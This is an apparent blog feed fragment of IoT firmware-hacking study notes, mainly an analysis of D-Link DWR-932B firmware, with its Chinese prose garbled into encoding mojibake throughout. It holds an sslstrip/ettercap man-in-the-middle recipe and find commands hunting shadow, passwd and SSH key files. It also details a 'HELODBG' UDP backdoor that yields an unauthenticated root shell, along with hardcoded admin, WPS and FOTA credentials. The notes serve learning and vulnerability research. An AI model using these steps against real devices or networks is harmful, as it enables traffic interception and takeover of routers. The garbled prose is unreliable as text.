    <content type="html"><![CDATA[<blockquote><p>æœ¬æ–‡å†…å®¹æ˜¯åŸºäºã€Šç‰©è”ç½‘æ¸—é€æµ‹è¯•ã€‹-ç¾Â·äºšä¼¦å¤å…¹æ›¼çš„å­¦ä¹ æ€»ç»“</p></blockquote><h2 id="åŸºäºå›ºä»¶ä»¿çœŸçš„åŠ¨æ€åˆ†æ"><a href="#åŸºäºå›ºä»¶ä»¿çœŸçš„åŠ¨æ€åˆ†æ" class="headerlink" title="åŸºäºå›ºä»¶ä»¿çœŸçš„åŠ¨æ€åˆ†æ"></a>åŸºäºå›ºä»¶ä»¿çœŸçš„åŠ¨æ€åˆ†æ</h2><h3 id="å‰æœŸå‡†å¤‡"><a href="#å‰æœŸå‡†å¤‡" class="headerlink" title="å‰æœŸå‡†å¤‡"></a>å‰æœŸå‡†å¤‡</h3><blockquote><p>ä¹¦æ¥ä¸Šä¸€ç¯‡æ–‡ç« çš„å®‰è£…é”™è¯¯ï¼Œåœ¨æˆ‘å‡ ä¹è¿ç»­ä¸æ–­çš„å°è¯•äº†10ä½™ä¸ªå°æ—¶åï¼Œç¯å¢ƒç»ˆäºæ­å»ºå®Œæ¯•ï¼Œè¿™é‡Œé‡‡ç”¨Ubuntu20.04ï¼ŒKaliæœ‰å„ç§å„æ ·å¥‡è‘©é—®é¢˜æ˜¯çœŸæœ‰ç‚¹éº»çƒ¦ã€‚</p><p>æœ¬ç¯‡æ–‡ç« å†™äº2020&#x2F;9&#x2F;15ï¼Œç”±äºæ—¶é—´æœ‰æ•ˆæ€§çš„å­˜åœ¨ï¼Œæœ¬ç¯‡æ–‡ç« ä»…ä¾›å‚è€ƒ</p></blockquote><p><img src="/img/article/iot-2/image-20220915191611191-1663245953755-2.png" alt="è¿è¡ŒæˆåŠŸæˆªå›¾"></p><h4 id="é¡¹ç›®ä¸‹è½½"><a href="#é¡¹ç›®ä¸‹è½½" class="headerlink" title="é¡¹ç›®ä¸‹è½½"></a>é¡¹ç›®ä¸‹è½½</h4><p>é¦–å…ˆä¸‹è½½ä¸‹æ¥é¡¹ç›®FAT</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">git <span class="hljs-built_in">clone</span> https://github.com/attify/firmware-analysis-toolkit<br><span class="hljs-built_in">cd</span> firmware-analysis-toolkit<br></code></pre></td></tr></table></figure><p><strong>è¿™é‡Œæ³¨æ„æ³¨æ„ï¼šå…ˆæ‰“å¼€ç¼–è¾‘setup.shï¼Œä¸æ˜¯è¿è¡Œä¸æ˜¯è¿è¡Œï¼ï¼ï¼</strong></p><p>å…ˆæ³¨é‡Šæ‰å®‰è£…binwalkçš„éƒ¨åˆ†ï¼Œæˆ‘ä»¬é‡‡ç”¨æ‰‹åŠ¨ç¼–è¯‘çš„æ–¹å¼</p><p><img src="/img/article/iot-2/image-20220915191827246.png" alt="image-20220915191827246"></p><h4 id="æ‰‹åŠ¨ç¼–è¯‘binwalk"><a href="#æ‰‹åŠ¨ç¼–è¯‘binwalk" class="headerlink" title="æ‰‹åŠ¨ç¼–è¯‘binwalk"></a>æ‰‹åŠ¨ç¼–è¯‘binwalk</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">git <span class="hljs-built_in">clone</span> --depth=1 https://github.com/ReFirmLabs/binwalk.git<br><span class="hljs-built_in">cd</span> binwalk<br>sed -i <span class="hljs-string">&#x27;/REQUIRED_UTILS=&quot;wget tar python&quot;/c\REQUIRED_UTILS=&quot;wget tar python3&quot;&#x27;</span> deps.sh<br></code></pre></td></tr></table></figure><p>è¿™æ—¶å€™è¦æ³¨æ„ä¸€ä¸ªç‚¹ï¼Œå…¶ä¸­çš„ä¸€éƒ¨åˆ†é“¾æ¥404æ‰¾ä¸åˆ°äº†ã€‚æˆ‘çªç„¶å‘ç°<strong>binwalk</strong>å¤šäº†ä¸€ä¸ª4å°æ—¶å‰çš„<strong>issue</strong>æ›´æ–°äº†é“¾æ¥ï¼Œæ˜¯çœŸæœäº†ã€‚<a href="https://github.com/ReFirmLabs/binwalk/pull/613">fix stuffit archiveâ€™s download url by dev2ero Â· Pull Request #613 Â· ReFirmLabs&#x2F;binwalk (github.com)</a></p><p><img src="/img/article/iot-2/image-20220915154244272.png" alt="image-20220915154244272"></p><p>éœ€è¦å‚ç…§è¿™ä¸ªissueç¡®å®šè‡ªå·±çš„ä¸‹è½½åœ°å€æ²¡æœ‰é—®é¢˜åï¼Œè¿è¡Œ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo ./deps.sh --<span class="hljs-built_in">yes</span><br>sudo python3 ./setup.py install<br>sudo apt-get install libmagic1<br></code></pre></td></tr></table></figure><blockquote><p> å¦‚æœåœ¨è¿è¡Œ.&#x2F;deps.shä¸­å‡ºç°é—®é¢˜ï¼Œå¯åŒæ ·æ ¹æ®å…¶è„šæœ¬æ‰‹åŠ¨è¾“å…¥å‘½åå®‰è£…ç›¸å…³ä¾èµ–</p></blockquote><h4 id="å®‰è£…jefferson"><a href="#å®‰è£…jefferson" class="headerlink" title="å®‰è£…jefferson"></a>å®‰è£…jefferson</h4><blockquote><p> <a href="https://github.com/sviehb/jefferson">sviehb&#x2F;jefferson: JFFS2 filesystem extraction tool (github.com)</a></p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">git <span class="hljs-built_in">clone</span> https://github.com/sviehb/jefferson.git<br><span class="hljs-built_in">cd</span> jefferson<br>sudo apt update<br>sudo apt install python3-pip liblzo2-dev<br>sudo python3 -m pip install -r requirements.txt<br>sudo python3 setup.py install<br></code></pre></td></tr></table></figure><p>å›åˆ°FATç›®å½•ä¸‹ï¼Œè¿è¡Œ<code>setup.sh</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">./setup.sh<br></code></pre></td></tr></table></figure><p>å®‰è£…æˆåŠŸåï¼Œæ›´æ”¹<code>fat.config</code>æ–‡ä»¶å†…çš„<code>root</code>å¯†ç ä¸ºå½“å‰ç³»ç»Ÿçš„<code>root</code>è´¦æˆ·å¯†ç </p><p><img src="/img/article/iot-2/image-20220915193111383.png" alt="image-20220915193111383"></p><p>ç„¶åæ­£å¸¸è¿è¡Œå³å¯ï¼Œæˆ‘å­˜æ”¾äº†ä¸€äº›å›ºä»¶åœ¨GitHubä¸Šå¯ä»¥ç”¨äºç»ƒä¹ ï¼š<a href="https://github.com/Loora1N/IOT-Frameware">Loora1N&#x2F;IOT-Frameware (github.com)</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">./fat.py &lt;firmware file&gt;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>ã€IOT å­¦ä¹ ä¸€ã€‘å›ºä»¶åˆ†æä¸æ¼æ´åˆ©ç”¨</title>
    <link href="/2022/09/14/%E3%80%90IOT%20%E5%AD%A6%E4%B9%A0%E4%B8%80%E3%80%91%E5%9B%BA%E4%BB%B6%E5%88%86%E6%9E%90%E4%B8%8E%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    <url>/2022/09/14/%E3%80%90IOT%20%E5%AD%A6%E4%B9%A0%E4%B8%80%E3%80%91%E5%9B%BA%E4%BB%B6%E5%88%86%E6%9E%90%E4%B8%8E%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</url>
    
    <content type="html"><![CDATA[<blockquote><p>æœ¬æ–‡å†…å®¹æ˜¯åŸºäºã€Šç‰©è”ç½‘æ¸—é€æµ‹è¯•ã€‹-ç¾Â·äºšä¼¦å¤å…¹æ›¼çš„å­¦ä¹ æ€»ç»“</p></blockquote><h2 id="å›ºä»¶æå–"><a href="#å›ºä»¶æå–" class="headerlink" title="å›ºä»¶æå–"></a>å›ºä»¶æå–</h2><ul><li><p>åœ¨ç¡¬ä»¶å‚å•†ç½‘ç«™å†…ç›´æ¥ä¸‹è½½</p></li><li><p>å›ºä»¶æ›´æ–°æ—¶ï¼Œåˆ©ç”¨ä¸­é—´äººæ”»å‡»ï¼Œè½¬å‘ä»£ç†æµé‡</p></li><li><p>é€šè¿‡ç‰©ç†è¿æ¥ï¼Œç›´æ¥ä»è®¾å¤‡è½¬å‚¨å›ºä»¶ã€‚å›ºä»¶å­˜å‚¨ä¸ºbinæ–‡ä»¶æŒ‡ä»¤:</p><p> <code>$ flashrom -p ft2232_spi:type=232H -r spidump.bin</code></p></li><li><p>åˆ©ç”¨æœç´¢å¼•æ“æœé›†å›ºä»¶ï¼Œè¿˜å¯ä»¥åˆ©ç”¨ <a href="https://www.exploit-db.com/google-hacking-database">Google Hackingæ•°æ®åº“</a>æœç´¢å›ºä»¶æˆ–è®¾å¤‡</p></li></ul><p><img src="/img/article/iot-1/image-20220914135931400.png" alt="image-20220914135931400"></p><h3 id="MITMè½¬å‘ä»£ç†æµé‡æµç¨‹"><a href="#MITMè½¬å‘ä»£ç†æµé‡æµç¨‹" class="headerlink" title="MITMè½¬å‘ä»£ç†æµé‡æµç¨‹"></a>MITMè½¬å‘ä»£ç†æµé‡æµç¨‹</h3><blockquote><p>æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬ç®€è¦ä»‹ç»äº†å¦‚ä½•ä½¿ç”¨Kali Linuxã€SSLstripã€ Ettercapå’ŒWiresharkæ­å»ºMITMæµ‹è¯•ç¯å¢ƒï¼Œä»¥åœ¨è®¾å¤‡æ›´æ–°æœŸé—´æ•è·è®¾å¤‡ æµé‡</p></blockquote><ol><li><p>å¯ç”¨IPè½¬å‘åŠŸèƒ½<code>echo 1 &gt; /proc/sys/net/ipv4/ip_forward</code></p></li><li><p>é…ç½®iptablesï¼Œå°†ç›®çš„ç«¯å£80çš„æµé‡é‡å®šå‘è‡³SSLstripç›‘å¬çš„ç«¯å£10000ã€‚<code>iptables -t nat -p tcp -A PREROUTING --dport 80 -j REDIRECT --to-port 10000</code></p></li><li><p>å¯åŠ¨SSLstrips: <code>sslstrip -a</code></p></li><li><p>å¯åŠ¨Ettercap GUIï¼š<code>ettercap -G</code></p></li></ol><p><img src="/img/article/iot-1/image-20220914134344716.png" alt="image-20220914134344716"></p><ol start="5"><li>åœ¨<code>primary interface</code>é€‰æ‹©è¦ç›‘å¬çš„è®¾å¤‡ï¼Œè¿™é‡Œé€‰æ‹©ç½‘å¡<code>eth0</code></li><li>å¯åŠ¨Wiresharkç¨‹åºï¼Œå¯¹<code>eth0</code>è¿›è¡ŒæŠ“åŒ…</li></ol><p><img src="/img/article/iot-1/image-20220914135308518.png" alt="image-20220914135308518"></p><ol start="7"><li>æ ¹æ®å®é™…éœ€æ±‚è¿‡æ»¤å…³æ³¨çš„æŠ¥æ–‡</li></ol><h2 id="å›ºä»¶æ–‡ä»¶åˆ†æ"><a href="#å›ºä»¶æ–‡ä»¶åˆ†æ" class="headerlink" title="å›ºä»¶æ–‡ä»¶åˆ†æ"></a>å›ºä»¶æ–‡ä»¶åˆ†æ</h2><blockquote><p>ä¸€èˆ¬ç›´æ¥ä½¿ç”¨ <code>binwalk -eM file.bin</code> å³å¯åˆ†è§£æ–‡ä»¶</p></blockquote><h3 id="D-Link-923Bå›ºä»¶æ–‡ä»¶ç³»ç»Ÿè·å–"><a href="#D-Link-923Bå›ºä»¶æ–‡ä»¶ç³»ç»Ÿè·å–" class="headerlink" title="D-Link 923Bå›ºä»¶æ–‡ä»¶ç³»ç»Ÿè·å–"></a>D-Link 923Bå›ºä»¶æ–‡ä»¶ç³»ç»Ÿè·å–</h3><blockquote><p>å›ºä»¶å‹ç¼©åŒ…<a href="https://media.dlink.eu/ftp/products/dwr/dwr-932/driver_software/DWR-932_fw_revB_2_02_eu_en_20150709.zip">ä¸‹è½½é“¾æ¥</a>ï¼Œç‰ˆæœ¬å·ä¸ºDWR-932_fw_revB_2_02_eu_en_20150709ã€‚å®‰å…¨ç ”ç©¶å‘˜Gianni Carabelliå’ŒPierre Kimå·²ç»åœ¨è¿™æ¬¾å›ºä»¶ä¸­æŒ–æ˜å‡ºäº†æ¼æ´ï¼Œè¿™é‡Œæˆ‘ä»¬åªæ˜¯ç”¨äºç»ƒä¹ </p></blockquote><p>é¦–å…ˆæ˜¯ä»å›ºä»¶ä¸­æå–æ–‡ä»¶ç³»ç»Ÿï¼Œå†…æœ‰åŠ å¯†è¿‡çš„zipå‹ç¼©åŒ…ï¼Œå¯ä»¥ä½¿ç”¨<code>fcrackzip</code>è¿›è¡Œå¯†ç çˆ†ç ´ï¼Œè¿™é‡Œçœç•¥çˆ†ç ´è¿‡ç¨‹ï¼Œç›´æ¥è¾“å…¥å¯†ç  <strong>beUT9Z</strong></p><p><img src="/img/article/iot-1/image-20220914145816127.png" alt="å‹ç¼©åŒ…å·²åŠ å¯†"></p><p>æ¥ä¸‹æ¥å¯ä»¥ä½¿ç”¨é’ˆå¯¹yaffs2æ ¼å¼ çš„å·¥å…·è§£å‹æ–‡ä»¶ç³»ç»Ÿæ¥æå–2K-mdm-image-mdm9625.yaffs2æ–‡ä»¶ï¼Œä¹Ÿå¯ä»¥ç›´æ¥é€šè¿‡Binwalkæ¥å®Œæˆæå–å·¥ä½œã€‚</p><blockquote><p>è¿™é‡Œæˆ‘é‡‡ç”¨çš„æ˜¯unyaffsï¼Œä¸‹è½½é“¾æ¥ <a href="https://code.google.com/archive/p/unyaffs/downloads">Google Code Archive - Long-term storage for Google Code Project Hosting.</a></p></blockquote><p>ä¸‹è½½å¯æ‰§è¡Œç¨‹åºåï¼Œä½¿ç”¨<code>./unyaffs file.yaffs2</code>æŒ‡ä»¤å³å¯</p><p><img src="/img/article/iot-1/image-20220914192637485.png" alt="image-20220914192637485"></p><p><img src="/img/article/iot-1/image-20220914192719147.png" alt="è§£å‹å‡ºçš„æ–‡ä»¶ç³»ç»Ÿ"></p><h3 id="æ‰‹åŠ¨ä¿¡æ¯æŒ–æ˜"><a href="#æ‰‹åŠ¨ä¿¡æ¯æŒ–æ˜" class="headerlink" title="æ‰‹åŠ¨ä¿¡æ¯æŒ–æ˜"></a>æ‰‹åŠ¨ä¿¡æ¯æŒ–æ˜</h3><p>ç„¶åæˆ‘ä»¬éœ€è¦åœ¨è¿™ä¸ªæ–‡ä»¶ç›®å½•ä¸­æŸ¥æ‰¾æœ‰ç”¨çš„ä¿¡æ¯ï¼Œå¦‚ä¸‹</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">find . -name <span class="hljs-string">&quot;*.conf&quot;</span><br>find . -name <span class="hljs-string">&quot;shadow&quot;</span><br>find . -name <span class="hljs-string">&quot;passwd&quot;</span><br>find . -name <span class="hljs-string">&quot;*config*&quot;</span><br>find . -name <span class="hljs-string">&quot;*history*&quot;</span><br>find . -name <span class="hljs-string">&quot;*ssh*_config*&quot;</span><br>find . -name <span class="hljs-string">&quot;*ssh_host*&quot;</span><br></code></pre></td></tr></table></figure><p><img src="/img/article/iot-1/image-20220914194404354.png" alt="æœç´¢ç¤ºä¾‹"></p><p>åœ¨<code>inadyn-mt.conf </code>æ–‡ä»¶ä¸­å­˜å‚¨äº†è·¯ç”±å™¨çš„no-IPé…ç½®ä¿¡æ¯ï¼ŒåŒ…æ‹¬ç”¨äºè®¿é—®ç½‘ç«™ <a href="https://www.no-ip.com/">no-ip</a>çš„ç”¨æˆ·åå’Œå£ä»¤</p><p><img src="/img/article/iot-1/image-20220914195009565.png" alt="image-20220914195009565"></p><p>æŸ¥çœ‹shadowæ–‡ä»¶</p><p><img src="/img/article/iot-1/image-20220914195346782.png" alt="image-20220914195346782"></p><p>æŸ¥çœ‹passwdæ–‡ä»¶</p><p><img src="/img/article/iot-1/image-20220914195118433.png" alt="image-20220914195118433"></p><h3 id="åˆ©ç”¨Firmwalkeræœç´¢æ•æ„Ÿä¿¡æ¯"><a href="#åˆ©ç”¨Firmwalkeræœç´¢æ•æ„Ÿä¿¡æ¯" class="headerlink" title="åˆ©ç”¨Firmwalkeræœç´¢æ•æ„Ÿä¿¡æ¯"></a>åˆ©ç”¨Firmwalkeræœç´¢æ•æ„Ÿä¿¡æ¯</h3><p>å®‰è£…firmwalker</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">npm i -g eslint                                                                       <br><br>git <span class="hljs-built_in">clone</span> https://github.com/craigz28/firmwalker.git <br></code></pre></td></tr></table></figure><p>ä½¿ç”¨æ–¹å¼</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">./firmwalker.sh &#123;floder path&#125;<br></code></pre></td></tr></table></figure><blockquote><p>Firmwalkerè„šæœ¬èƒ½å¤Ÿè¯†åˆ«å‡ºå¤šç§æ•æ„Ÿä¿¡æ¯ï¼ŒåŒ…æ‹¬äºŒè¿›åˆ¶æ–‡ä»¶ã€ è¯ä¹¦ã€IPåœ°å€ã€ç§é’¥ç­‰ï¼ŒåŒæ—¶å°†è¾“å‡ºç»“æœéƒ½ä¿å­˜åœ¨<strong>firmwalker.txt</strong>æ–‡ ä»¶ä¹‹ä¸­</p></blockquote><p><img src="/img/article/iot-1/image-20220914202334231.png" alt="image-20220914202334231"></p><p><img src="/img/article/iot-1/image-20220914204146429.png" alt="firmwalker.txt"></p><h3 id="æŸ¥çœ‹å¯åŠ¨é¡¹"><a href="#æŸ¥çœ‹å¯åŠ¨é¡¹" class="headerlink" title="æŸ¥çœ‹å¯åŠ¨é¡¹"></a>æŸ¥çœ‹å¯åŠ¨é¡¹</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> /etc/init.d<br></code></pre></td></tr></table></figure><p><img src="/img/article/iot-1/image-20220914214159035.png" alt="image-20220914214159035"></p><p>è¿™é‡Œå¯ä»¥æŸ¥çœ‹ <strong>start_appmgr</strong>è„šæœ¬ï¼Œä¸€èˆ¬æ¥è¯´mgrå°±æ˜¯ä¸»æ§ç¨‹åºçš„æ„æ€  </p><p><img src="/img/article/iot-1/image-20220914214951502.png" alt="image-20220914214951502"></p><p>å¯ä»¥çœ‹åˆ°è¯¥è„šæœ¬åœ¨å¼€æœºæ—¶ä¼šä»¥æœåŠ¡çš„å½¢å¼è¿è¡Œ<code>/bin/appmgr</code>ç¨‹åºï¼ŒåŒæ—¶è¯¥è„šæœ¬è¿˜ä¼šå¼€å¯<strong>telnet</strong>æœåŠ¡</p><p><img src="/img/article/iot-1/image-20220914215128332.png" alt="image-20220914215128332"></p><h3 id="appmgråˆ†æ"><a href="#appmgråˆ†æ" class="headerlink" title="appmgråˆ†æ"></a>appmgråˆ†æ</h3><p>ç”¨IDA PROæ‰“å¼€<code>/bin/appmg</code>ç¨‹åºè¿›è¡Œé€†å‘åˆ†æï¼Œå¯ä»¥å‘ç°æœ‰ä¸€ä¸ªçº¿ç¨‹ä¼šæŒç»­ç›‘å¬ 0.0.0.0:39889ï¼ˆUDPï¼‰ï¼ˆè¿™ä¸ªIPå’Œç«¯å£è¿˜æ˜¯æ²¡æœ‰ç¡®å®šå‡ºæ¥ï¼‰ï¼Œå¹¶ç­‰å¾…ä¼ å…¥æ§åˆ¶å‘½ä»¤,å¦‚æœæŸä¸ªç”¨æˆ·å‘ç›®æ ‡è·¯ç”±å™¨å‘é€äº†ä¸€ä¸ª <code>HELODBG</code> å­—ç¬¦ä¸²ï¼Œé‚£ä¹ˆè·¯ç”±å™¨å°†ä¼šæ‰§è¡Œ <code>/sbin/telnetd -l /bin/sh</code> ï¼Œå¹¶å…è®¸è¿™åç”¨æˆ·åœ¨æœªç»èº«ä»½éªŒè¯çš„æƒ…å†µä¸‹ä»¥ root ç”¨æˆ·çš„èº«ä»½ç™»å½•è·¯ç”±å™¨ã€‚</p><blockquote><p>è¿™é‡Œçš„-11877è½¬æ¢äºŒè¿›åˆ¶åï¼Œæœ«å°¾ä¸¤å­—èŠ‚ä¸ºportï¼Œå‰é¢éƒ½æ˜¯0ï¼Œæœ«å°¾å­—èŠ‚ä¸º<strong>\xD1\x9B</strong>æ³¨æ„å°æ®µå­˜å‚¨æ–¹å¼ï¼Œåˆ™portå·ä¸º<strong>9BD1</strong>å³<strong>39889</strong></p></blockquote><p><img src="/img/article/iot-1/image-20220914223737117.png" alt="image-20220914223737117"></p><p><img src="/img/article/iot-1/image-20220914223809561.png" alt="image-20220914223809561"></p><p>æœç´¢ <strong>mod_sysadm_config_passwd</strong> å‡½æ•°ï¼Œå¯ä»¥å¾—åˆ°adminé»˜è®¤å¯†ç </p><p><img src="/img/article/iot-1/image-20220914231714471.png" alt="image-20220914231714471"></p><p>è·¯ç”±å™¨çš„ç®¡ç†å‘˜è´¦å·ã€‚è®¾å¤‡çš„ç®¡ç†å‘˜è´¦å·é»˜è®¤ä¸ºâ€œadminâ€ï¼Œè€Œå¯†ç åŒæ ·ä¹Ÿæ˜¯â€œadminâ€ã€‚</p><p>æœç´¢ <strong>wifi_get_default_wps_pin</strong> å‡½æ•°</p><p><img src="/img/article/iot-1/image-20220914231829944.png" alt="image-20220914231829944"></p><p>é»˜è®¤é…ç½®ä¸‹ï¼Œè¯¥è·¯ç”±å™¨ WPS ç³»ç»Ÿçš„ PIN ç æ°¸è¿œéƒ½æ˜¯ <code>28296607</code> å› ä¸ºè¿™ä¸ª PIN ç æ˜¯ç¡¬ç¼–ç åœ¨ <code>/bin/appmgr</code> ç¨‹åºä¸­</p><h3 id="fotad-åˆ†æ"><a href="#fotad-åˆ†æ" class="headerlink" title="fotad åˆ†æ"></a>fotad åˆ†æ</h3><p>è·¯ç”±å™¨ä¸ FOTA æœåŠ¡å™¨è¿›è¡Œé€šä¿¡æ—¶çš„å‡­è¯æ•°æ®ç¡¬ç¼–ç åœ¨ <code>/sbin/fotad</code> ä»£ç ä¸­ï¼Œæˆ‘ä»¬ç”¨ IDA è¿›è¡Œåˆ†æ</p><p>æœç´¢ <code>sub_CAAC </code>å‡½æ•°,å¯ä»¥å‘ç°è¢« base64 è¿‡çš„å‡­è¯</p><p><img src="/img/article/iot-1/image-20220914232237866.png" alt="image-20220914232237866"></p><p>ç”¨æˆ·&#x2F;å¯†ç å¦‚ä¸‹</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros">cWRwYzpxZHBj        qdpc:qdpc<br>cWRwZTpxZHBl        qdpe:qdpe<br><span class="hljs-attribute">cWRwOnFkcA</span>==        qdp:qdp<br></code></pre></td></tr></table></figure><h3 id="UPnPå®‰å…¨é—®é¢˜"><a href="#UPnPå®‰å…¨é—®é¢˜" class="headerlink" title="UPnPå®‰å…¨é—®é¢˜"></a>UPnPå®‰å…¨é—®é¢˜</h3><p>UPnP å…è®¸ç”¨æˆ·åŠ¨æ€æ·»åŠ é˜²ç«å¢™è§„åˆ™ã€‚å› ä¸ºè¿™ç§åšæ³•ä¼šå¸¦æ¥ä¸€å®šçš„å®‰å…¨é£é™©ï¼Œå› æ­¤è®¾å¤‡é€šå¸¸éƒ½ä¼šå¯¹è¿™ç§æ“ä½œè¿›è¡Œé™åˆ¶ï¼Œä»¥é¿å…ä¸å—ä¿¡ä»»çš„å®¢æˆ·ç«¯æ·»åŠ ä¸å®‰å…¨çš„é˜²ç«å¢™è§„åˆ™ã€‚</p><p>UPnP çš„ä¸å®‰å…¨æ€§æ—©åœ¨2006å¹´å°±å·²ç»æ˜¯ä¼—æ‰€å‘¨çŸ¥çš„äº‹æƒ…äº†ã€‚è€Œè¯¥è·¯ç”±å™¨ä¸­ UPnP ç¨‹åºçš„å®‰å…¨ç­‰çº§ä»ç„¶éå¸¸çš„ä½ï¼Œå¤„äºå±€åŸŸç½‘å†…çš„æ”»å‡»è€…å¯ä»¥éšæ„ä¿®æ”¹è·¯ç”±å™¨çš„ç«¯å£è½¬å‘è§„åˆ™ã€‚</p><p>æ–‡ä»¶ <code>/var/miniupnpd.conf</code> æ˜¯ç”± <code>/bin/appmgr</code> ç¨‹åºç”Ÿæˆçš„ï¼š</p><p>æœç´¢ sub_2AE0C å‡½æ•°</p><p><img src="/img/article/iot-1/image-20220914232710172.png" alt="image-20220914232710172"></p><p>è¯¥ç¨‹åºä¼šç”Ÿæˆ <code>/var/miniupnpd.conf</code>ï¼š</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">ext_ifname</span>=rmnet0<br><span class="hljs-attr">listening_ip</span>=bridge0<br><span class="hljs-attr">port</span>=<span class="hljs-number">2869</span><br><span class="hljs-attr">enable_natpmp</span>=<span class="hljs-literal">yes</span><br><span class="hljs-attr">enable_upnp</span>=<span class="hljs-literal">yes</span><br><span class="hljs-attr">bitrate_up</span>=<span class="hljs-number">14000000</span><br><span class="hljs-attr">bitrate_down</span>=<span class="hljs-number">14000000</span><br><span class="hljs-attr">secure_mode</span>=<span class="hljs-literal">no</span>      <span class="hljs-comment"># &quot;secure&quot; mode : when enabled, UPnP client are allowed to add mappings only to their IP.</span><br><span class="hljs-attr">presentation_url</span>=http://<span class="hljs-number">192.168</span>.<span class="hljs-number">1.1</span><br><span class="hljs-attr">system_uptime</span>=<span class="hljs-literal">yes</span><br><span class="hljs-attr">notify_interval</span>=<span class="hljs-number">30</span><br><span class="hljs-attr">upnp_forward_chain</span>=MINIUPNPD<br><span class="hljs-attr">upnp_nat_chain</span>=MINIUPNPD<br></code></pre></td></tr></table></figure><h2 id="åŸºäºå›ºä»¶ä»¿çœŸçš„åŠ¨æ€åˆ†æ"><a href="#åŸºäºå›ºä»¶ä»¿çœŸçš„åŠ¨æ€åˆ†æ" class="headerlink" title="åŸºäºå›ºä»¶ä»¿çœŸçš„åŠ¨æ€åˆ†æ"></a>åŸºäºå›ºä»¶ä»¿çœŸçš„åŠ¨æ€åˆ†æ</h2><h3 id="å‡†å¤‡å·¥ä½œ"><a href="#å‡†å¤‡å·¥ä½œ" class="headerlink" title="å‡†å¤‡å·¥ä½œ"></a>å‡†å¤‡å·¥ä½œ</h3><p>å®‰è£…<strong>FAT(Firmware-Analysis-Toolkit)<strong>ï¼Œæ‰§è¡Œä»¥ä¸‹å‘½ä»¤å³å¯ï¼Œä½†éœ€æ³¨æ„ç¯å¢ƒéœ€åŒæ—¶å…·æœ‰</strong>python2</strong>å’Œ<strong>python3</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">git <span class="hljs-built_in">clone</span> https://github.com/attify/firmware-analysis-toolkit<br><span class="hljs-built_in">cd</span> firmware-analysis-toolkit<br>./setup.sh<br></code></pre></td></tr></table></figure><blockquote><p>Kaliå’ŒUbuntuå®‰è£…éƒ½å‡ºç°äº†ä¸€äº›é—®é¢˜äººéº»äº†</p></blockquote><p><img src="/img/article/iot-1/image-20220914212925067.png" alt="Ubuntuå®‰è£…é”™è¯¯"></p><p>Kaliåˆ™æ˜¯æŠ¥æ‰¾ä¸åˆ°<strong>Package â€˜lsb-coreâ€™ has no installation candidate</strong></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>D-Link 923Bè·¯ç”±å™¨æ•æ„Ÿä¿¡æ¯æœé›†</title>
    <link href="/2022/09/14/firmwalker-DLINK923B/"/>
    <url>/2022/09/14/firmwalker-DLINK923B/</url>
    
    <content type="html"><![CDATA[<p><em><strong>Firmware Directory</strong></em><br>&#x2F;root&#x2F;iot&#x2F;D-LINK923B&#x2F;2k&#x2F;root<br><em><strong>Search for password files</strong></em><br>##################################### passwd<br>t&#x2F;bin&#x2F;passwd<br>t&#x2F;etc&#x2F;passwd<br>t&#x2F;var&#x2F;lib&#x2F;opkg&#x2F;alternatives&#x2F;passwd</p><p>##################################### shadow<br>t&#x2F;etc&#x2F;shadow</p><p>##################################### *.psk</p><p><em><strong>Search for Unix-MD5 hashes</strong></em></p><p><em><strong>Search for SSL related files</strong></em><br>##################################### *.crt</p><p>##################################### *.pem</p><p>##################################### *.cer</p><p>##################################### *.p7b</p><p>##################################### *.p12</p><p>##################################### *.key</p><p><em><strong>Search for SSH related files</strong></em><br>##################################### authorized_keys</p><p>##################################### <em>authorized_keys</em></p><p>##################################### host_key</p><p>##################################### <em>host_key</em></p><p>##################################### id_rsa</p><p>##################################### <em>id_rsa</em></p><p>##################################### id_dsa</p><p>##################################### <em>id_dsa</em></p><p>##################################### *.pub</p><p><em><strong>Search for files</strong></em><br>##################################### 